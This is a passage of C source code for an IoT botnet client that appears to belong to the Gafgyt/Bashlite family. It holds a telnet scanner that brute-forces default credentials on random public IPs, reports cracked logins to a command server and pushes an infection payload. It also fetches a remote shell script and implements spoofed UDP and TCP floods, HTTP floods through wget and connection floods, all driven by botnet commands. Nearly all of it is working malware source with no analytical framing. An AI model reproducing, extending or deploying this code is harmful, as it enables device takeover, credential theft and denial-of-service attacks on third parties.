	 return inet_addr(ip);
 }
in_addr_t getRandomPublicIP4()
{
	char ip[16] = {0};
	if(ipState[1] > 0 && ipState[4] < 255){
		ipState[4]++;
		szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
		return inet_addr(ip);
	}else if(ipState[4] > 254){
		if(ipState[3] < 255){
			ipState[4] = 0;
			ipState[3]++;
			szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
			return inet_addr(ip);
		}else{
			sendstatsforbrange(ipState[1],ipState[2]);
		}
	}
 
	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = 0;
	ipState[4] = 0;
	while(
		 (ipState[1] == 0) ||
		 (ipState[1] == 10) ||
		 (ipState[1] == 127) ||
		 (ipState[1] == 169 && ipState[2] == 254) ||
		 (ipState[1] == 192 && ipState[2] == 168) ||
		 (ipState[1] >= 224)
	)
	{
		 ipState[1] = rand() % 255;
		 ipState[2] = rand() % 255;
	}
	szprintf(ip, "%d.%d.0.0", ipState[1], ipState[2]);
	return inet_addr(ip);
 }
in_addr_t getRandomPublicIP()
{
	    //if(ipState[1] > 0 && ipState[4] < 255)
        //{
        //        ipState[4]++;
        //        char ip[16] = {0};
        //        szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
        //        return inet_addr(ip);
        //}
		
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;

        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
				(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 52) ||
				(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 49) ||
				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 190) ||
				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 189) ||
				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 188) ||
				(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 137) ||
				(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 136) ||
				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 147) ||
				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 146) ||
				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 145) ||
				(ipState[0] == 63 && ipState[1] == 141 && ipState[2] == 241) ||
				(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 192) ||
				(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 244) ||
				(ipState[0] == 69 && ipState[1] == 197 && ipState[2] == 128) ||
				(ipState[0] == 162 && ipState[1] == 251 && ipState[2] == 120) ||
				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 128) ||
				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 180) ||
				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 250) ||
				(ipState[0] == 192 && ipState[1] == 187 && ipState[2] == 113) ||
				(ipState[0] == 198 && ipState[1] == 204 && ipState[2] == 241) ||
				(ipState[0] == 204 && ipState[1] == 10 && ipState[2] == 160) ||
				(ipState[0] == 204 && ipState[1] == 12 && ipState[2] == 192) ||
				(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 64) ||
				(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 72) ||
				(ipState[0] == 208 && ipState[1] == 67) ||
				(ipState[0] == 94 && ipState[1] == 102 && ipState[2] == 48) ||
				(ipState[0] == 93 && ipState[1] == 174 && ipState[2] == 88) ||
				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 174) ||
				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 172) ||
				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 170) ||
				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 169) ||
				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 160) ||
                (ipState[0] >= 224)
			)
        {
                ipState[0] = rand() % 255;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }

        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

in_addr_t getRandomPublicIPA()
{
		int range = rand() % (sizeof(rangesA)/sizeof(char *));
        ipState[0] = rangesA[range];
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

in_addr_t getRandomPublicIPB()
{
		int range = rand() % (sizeof(rangesB1)/sizeof(char *));
        ipState[0] = rangesB1[range];
        ipState[1] = rangesB2[range];
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

in_addr_t getRandomPublicIPC()
{
		int range = rand() % (sizeof(rangesC1)/sizeof(char *));
        ipState[0] = rangesC1[range];
        ipState[1] = rangesC2[range];
        ipState[2] = rangesC3[range];
        ipState[3] = rand() % 255;
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}


in_addr_t findARandomIP()
{
	if(rangechoice == 1){
		return getRandomPublicIP();
	}else if(rangechoice == 2){
		return getRandomPublicIPA();
	}else if(rangechoice == 3){
		return getRandomPublicIPB();
	}else if(rangechoice == 4){
		return getRandomPublicIPC();
	}else if(rangechoice == 5){
		return getRandomPublicIP3();
	}else if(rangechoice == 6){
		return getRandomPublicIP4();
	}else{
		return getRandomPublicIP();
	}
}



in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd)
{
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
int socket_connect(char *host, in_port_t port){
        struct hostent *hp;
        struct sockaddr_in addr;
        int on = 1, sock;     

        if((hp = gethostbyname(host)) == NULL){
                herror("gethostbyname");
                exit(1);
        }
        bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

        if(sock == -1){
                perror("setsockopt");
                exit(1);
        }
        
        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
                perror("connect");
                exit(1);

        }
        return sock;
}

void echoLoader()
{
        char buffer[BUFFER_SIZE];
        int fd;
        fd = socket_connect("0.0.0.0", 80); 
        write(fd, "GET gtop.sh\r\n", strlen("GET gtop.sh\r\n")); // write(fd, char[]*, len);  
        bzero(buffer, BUFFER_SIZE);
        
        while(read(fd, buffer, BUFFER_SIZE - 1) != 0){
                FILE *f;
                f = fopen("x", "a");
                fprintf(f, "%s", buffer);
                fclose(f);
                bzero(buffer, BUFFER_SIZE);
        }

        shutdown(fd, SHUT_RDWR); 
        close(fd);
}

void StartTheLelz(int maxfds, int wait_usec, int timeout)
{
        int i, res, num_tmps, j;
        char buf[128], cur_dir;

		int max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;

        int counter = 50;
        while(counter--)
        {
                srand(time(NULL) ^ rand_cmwc());
                init_rand(rand());
        }
		
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        buffer = malloc(BUFFER_SIZE + 1);
        memset(buffer, 0, BUFFER_SIZE + 1);

        struct telstate_t fds[max];


        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }
        for(num_tmps = 0; tmpdirs[++num_tmps] != 0; );



        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        if(fds[i].totalTimeout == 0)
                        {
                                fds[i].totalTimeout = time(NULL);
                        }

                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        if(fds[i].complete == 1)
                                        {
                                                // clear the current fd
                                                char *tmp = fds[i].sockbuf;
                                                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                                                fds[i].sockbuf = tmp;
                                                // get a new random ip
												fds[i].ip = findARandomIP();
                                        }
                                        else if(fds[i].complete == 0)
                                        {
                                                fds[i].passwordInd++;
												fds[i].usernameInd++;

                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                        }

                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;

                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                                        if(fds[i].fd == -1) continue;

                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                                        {
                                                reset_telstate(&fds[i]);
                                        }
                                        else
                                        {
                                                advance_state(&fds[i], 1);
                                        }
                                }
                                break;

																case 1:
																	{
																		FD_ZERO(&fdset);
																		FD_SET(fds[i].fd, &fdset);
																		tv.tv_sec = 0;
																		tv.tv_usec = wait_usec;
																		res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
													
																		if(res == 1)
																		{
																			lon = sizeof(int);
																			valopt = 0;
																			getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
																			//printf("%d\n",valopt);
																			if(valopt)
																			{
																				reset_telstate(&fds[i]);
																			}
																			else
																			{
																				fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
																				advance_state(&fds[i], 2);
																			}
																			continue;
																		}
																		else if(res == -1)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(fds[i].totalTimeout + timeout < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 2:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 3);
																			}
													
																			continue;
																		}
													
																		if(fds[i].totalTimeout + timeout*2 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 3:
																	{
																		if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		advance_state(&fds[i], 4);
																	}
																	break;
													
																case 4:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 5);
																			}
																			continue;
																		}
													
																		if(fds[i].totalTimeout + timeout*2 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 5:
																	{
																		if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		advance_state(&fds[i], 6);
																	}
																	break;
													
																case 6:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2))
																		{
																			fds[i].totalTimeout = time(NULL);
													
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else if(contains_success(fds[i].sockbuf))
																			{
																				if(fds[i].complete == 2)
																				{
																					advance_state(&fds[i], 7);
																				}
																				else
																				{
																					sockprintf(mainCommSock, "TELNET LOGIN CRACKED - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
																					sockprintf(mainCommSock, "unctelnet %s|%s|%s|23", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
																					hacked++;
																					advance_state(&fds[i], 7);
																				}
																			}
																			else
																			{
																				reset_telstate(&fds[i]);
																			}
																			continue;
																		}

													
																		if(fds[i].totalTimeout + timeout*2 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;							
																case 7:
																	{
																		for(j = 0; j < num_tmps; j++)
																		{
																			memset(buf, 0, 128);
																			if(j == 0)
																				snprintf(buf, 127, ">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j], tmpdirs[j]);
																			else
																				snprintf(buf, 127, ">%s.t && cd %s ; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j]);
													
																			if(send(fds[i].fd, buf, strlen(buf), MSG_NOSIGNAL) < 0)
																			{
																				reset_telstate(&fds[i]);
																				continue;
																			}
																		}												
																		advance_state(&fds[i], 8);
																	}
                                  break;
                                  case 8:
								  {
                              fds[i].totalTimeout = time(NULL);
                              if(send(fds[i].fd, infect, strlen(infect), MSG_NOSIGNAL) < 0)
                                  {
									sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                    reset_telstate(&fds[i]);
                                    continue;
                                  }
								  	if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, infected))
									{
										if(strcasestr(fds[i].sockbuf, infectedmessage) && fds[i].complete != 3)
										{
											sockprintf(mainCommSock, "INFECTION SUCCESS - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
											sockprintf(mainCommSock, "Telnet\'d %s|%s|%s|23", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
											fds[i].complete = 3;
										}
									}
                                      if(fds[i].totalTimeout + 300 < time(NULL))
                                      {
										if(fds[i].complete !=3){
											sockprintf(mainCommSock, "FAILED TO INFECT - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);  
										}
                                        reset_telstate(&fds[i]);
                                      }
                                    break;
                        }
            }
        }
    }				
}

void sendSTD(unsigned char *ip, int port, int secs) {

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                close(iSTD_Sock);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
	

}

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
				register unsigned int ii = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                        if(ii == sleepcheck)
                        {
                            usleep(sleeptime*1000);
							ii = 0;
                            continue;
                        }
                        ii++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
                        sockprintf(mainCommSock, "Failed setting raw headers mode.");
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
				register unsigned int ii = 0;
                while(1)
                {
                    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                    udph->source = rand_cmwc();
                    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                    iph->id = rand_cmwc();
                    iph->saddr = htonl( getRandomIP(netmask) );
                    iph->check = csum ((unsigned short *) packet, iph->tot_len);

                    if(i == pollRegister)
                    {
                            if(time(NULL) > end) break;
                            i = 0;
                            continue;
                    }
                    i++;
					
					if(ii == sleepcheck)
                    {
                        usleep(sleeptime*1000);
						ii = 0;
                        continue;
                    }
                    ii++;
                }
        }
}

void spoofTest(unsigned char *target, int port)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

		
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd)
        {
                sockprintf(mainCommSock, "Failed opening raw socket.");
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                sockprintf(mainCommSock, "Failed setting raw headers mode.");
                return;
        }

        int counter = 50;
        while(counter--)
        {
                srand(time(NULL) ^ rand_cmwc());
                init_rand(rand());
        }

        in_addr_t netmask;

        netmask = ( ~((in_addr_t) -1) );

		char *test = "";
		szprintf(test,"%s",inet_ntoa(ourPublicIP));
		
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(test)];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + strlen(test));

        udph->len = htons(sizeof(struct udphdr) + strlen(test));
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
		
		szprintf((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), "%s", test);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                sockprintf(mainCommSock, "Failed opening raw socket.");
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                sockprintf(mainCommSock, "Failed setting raw headers mode.");
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                                sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
		register unsigned int ii = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(ii >= sleepcheck)
                {
                        ii = 0;
                        usleep(sleeptime*1000);
                }
                ii++;
				
                if(i >= pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void sendHTTP(unsigned char *url, int end_time, int sleepcheck, int sleeptime)
{
	int end = time(NULL) + end_time;
	FILE *pf;
	char *UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
	
	char *command[80];
	sprintf(command,"wget -s -U \"");
	strcat(command, UA);
	strcat(command,"\" -q ");
	strcat(command, url);
	unsigned int ii = 0;
	
	while(end > time(NULL))
	{
		UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
		sprintf(command,"wget -s -U \"");
		strcat(command, UA);
		strcat(command,"\" -q ");
		strcat(command, url);
		system(command);
		
		if(ii == sleepcheck)
		{
			usleep(sleeptime*1000);
			ii = 0;
			continue;
		}
		ii++;
	}
	
}

void sendHTTP2(unsigned char *url, int end_time, int sleepcheck, int sleeptime)
{
	int end = time(NULL) + end_time;
	char *UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
	
	
	char *command[80];
	sprintf(command,"wget -O /tmp/yuagwduiagwdhg/a -U \"");
	strcat(command, UA);
	strcat(command,"\" -q ");
	strcat(command, url);
	unsigned int ii = 0;
	
	while(end > time(NULL))
	{
		UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
		sprintf(command,"wget -O /tmp/yuagwduiagwdhg/a -U \"");
		strcat(command, UA);
		strcat(command,"\" -q ");
		strcat(command, url);
		system(command);
		
		if(ii == sleepcheck)
		{
			usleep(sleeptime*1000);
			ii = 0;
			continue;
		}
		ii++;
	}
	
}

void sendCNC(unsigned char *ip,int port, int end_time, int sleepcheck, int connectfor)
{
	int end = time(NULL) + end_time;
	int sockfd;
	struct sockaddr_in server;
	//sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
	
	while(end > time(NULL))
	{
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		connect(sockfd , (struct sockaddr *)&server , sizeof(server));
		sleep(connectfor);
		close(sockfd);
		sleep(sleepcheck);
	}
	
}

void processCmd(int argc, unsigned char *argv[])
{
	int x;
        if(!strcmp(argv[0], "PING"))
        {
                sockprintf(mainCommSock, "PONG!");
                return;
        }
		
		if(!strcmp(argv[0], "NUP"))
        {
			if(argc > 0){
				char *ip = argv[1];
                ourPublicIP.s_addr = inet_addr(ip);
				sockprintf(mainCommSock, "TEST %s", inet_ntoa(ourIP));
			}
            return;
        }
		
		if(!strcmp(argv[0], "SPOOF"))
        {
			if(argc > 2){
				char *ip = argv[1];
				int port = argv[2];
                spoofTest(ip,port);
			}
            return;
        }
		
        if(!strcmp(argv[0], "KILLSUB"))
        {
			if(argc < 1 ){
				sockprintf(mainCommSock, "KILLSUB <sub version to kill>");
			}else{
				int subbbb = atoi(argv[1]);
				if(subbbb == subversionnnn){
					sockprintf(mainCommSock, "KMS!");
					exit(0);
				}else{
					sockprintf(mainCommSock, "not killing myself cuz im not that version");
				}
			}
        }
        if(!strcmp(argv[0], "TABLE"))
        {
            sockprintf(mainCommSock, "%d", getdtablesize());
            return;
        }
        if(!strcmp(argv[0], "SCAN"))
        {
			if(argc < 3)
			{
